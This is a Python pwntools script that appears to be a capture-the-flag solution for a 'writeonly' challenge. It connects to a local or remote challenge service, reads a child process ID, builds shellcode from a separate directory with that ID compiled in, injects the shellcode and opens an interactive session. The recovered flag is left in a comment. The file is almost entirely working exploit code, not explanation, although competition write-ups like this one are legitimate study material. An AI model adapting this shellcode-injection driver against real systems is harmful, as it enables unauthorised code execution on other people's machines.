#!/usr/bin/env python3
import shutil
from pwn import *


def main():
    if args.LOCAL:
        tube = process(['./chal'])
    else:
        tube = remote('writeonly.2020.ctfcompetition.com', 1337)
    tube.recvuntil(b'[DEBUG] child pid: ')
    pid = int(tube.recvline())
    with open('shellcode/shellcode.h', 'w') as fp:
        fp.write(f'#define PID_STR "{pid}"\n')
    subprocess.check_call(['make'], cwd='shellcode')
    with open('shellcode/shellcode.bin', 'rb') as fp:
        shellcode = fp.read()
    with tube:
        tube.recvuntil(b'shellcode length? ')
        tube.sendline(str(len(shellcode)))
        tube.recvuntil(b'bytes of shellcode. ')
        tube.send(shellcode)
        tube.interactive()
    # CTF{why_read_when_you_can_write}


if __name__ == '__main__':
    main()
